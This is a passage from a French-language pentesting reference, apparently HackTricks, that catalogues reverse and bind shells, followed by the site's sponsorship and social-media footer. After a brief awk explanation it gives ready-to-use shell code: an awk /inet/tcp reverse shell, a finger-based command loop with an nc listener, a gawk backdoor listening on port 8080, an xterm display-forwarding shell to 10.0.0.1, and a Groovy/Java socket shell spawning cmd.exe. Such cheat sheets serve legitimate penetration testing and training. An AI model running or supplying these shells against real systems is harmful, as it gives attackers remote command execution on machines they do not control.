Dans cet exemple, "motif" est le motif que nous recherchons dans le fichier et "action" est l'action que nous souhaitons effectuer sur les lignes correspondantes. Par exemple, si nous voulons afficher toutes les lignes contenant le mot "hack", nous pouvons utiliser la commande suivante :

```bash
awk '/hack/ { print }' fichier
```

Awk offre également de nombreuses fonctionnalités avancées, telles que la manipulation de champs et de variables, qui permettent de réaliser des tâches plus complexes. Par exemple, pour afficher uniquement le deuxième champ de chaque ligne, nous pouvons utiliser la commande suivante :

```bash
awk '{ print $2 }' fichier
```

Awk est un outil puissant pour manipuler et analyser des données dans un fichier. Il est largement utilisé dans les tâches de traitement de texte et de manipulation de fichiers, et il est un élément essentiel de la boîte à outils de tout hacker.
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
## Finger

**Attaquant**
```bash
while true; do nc -l 79; done
```
Pour envoyer la commande, écrivez-la, appuyez sur Entrée et appuyez sur CTRL+D (pour arrêter STDIN)

**Victime**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk

Gawk est un puissant outil de manipulation de texte en ligne de commande pour les systèmes Linux. Il est utilisé pour extraire, manipuler et transformer des données textuelles de manière efficace. Gawk est un langage de programmation complet qui offre des fonctionnalités avancées telles que les expressions régulières, les tableaux associatifs et les fonctions intégrées.

Voici quelques exemples d'utilisation de Gawk :

- Extraction de données : Gawk peut être utilisé pour extraire des informations spécifiques à partir de fichiers texte en utilisant des motifs et des expressions régulières. Par exemple, vous pouvez extraire les adresses e-mail à partir d'un fichier de journal.

- Manipulation de données : Gawk permet de manipuler les données en effectuant des opérations telles que le tri, le filtrage, la fusion et la transformation. Par exemple, vous pouvez trier les lignes d'un fichier en fonction d'un champ spécifique.

- Traitement de fichiers CSV : Gawk est particulièrement utile pour le traitement de fichiers CSV. Il peut être utilisé pour lire, modifier et générer des fichiers CSV en utilisant des délimiteurs personnalisés.

- Automatisation de tâches : Gawk peut être utilisé pour automatiser des tâches répétitives en utilisant des scripts. Par exemple, vous pouvez écrire un script Gawk pour renommer plusieurs fichiers en une seule fois.

Gawk est un outil polyvalent et puissant qui peut être utilisé dans de nombreux scénarios de manipulation de texte. Il est largement utilisé par les administrateurs système, les développeurs et les analystes de données pour simplifier et automatiser les tâches liées au traitement de texte.
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

Une des formes les plus simples de shell inversé est une session xterm. La commande suivante doit être exécutée sur le serveur. Elle tentera de se connecter à vous (10.0.0.1) sur le port TCP 6001.
```bash
xterm -display 10.0.0.1:1
```
Pour intercepter le xterm entrant, démarrez un serveur X (:1 - qui écoute sur le port TCP 6001). Une façon de le faire est avec Xnest (à exécuter sur votre système) :
```bash
Xnest :1
```
Vous devrez autoriser la cible à se connecter à vous (commande également exécutée sur votre hôte) :
```bash
xhost +targetip
```
## Groovy

par [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) REMARQUE: Les shells inversés Java fonctionnent également pour Groovy
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## Bibliographie

{% embed url="https://highon.coffee/blog/reverse-shell-cheat-sheet/" %}

{% embed url="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell" %}

{% embed url="https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" %}

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vulnérabilités les plus importantes afin de pouvoir les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des analyses de menace proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) dès aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
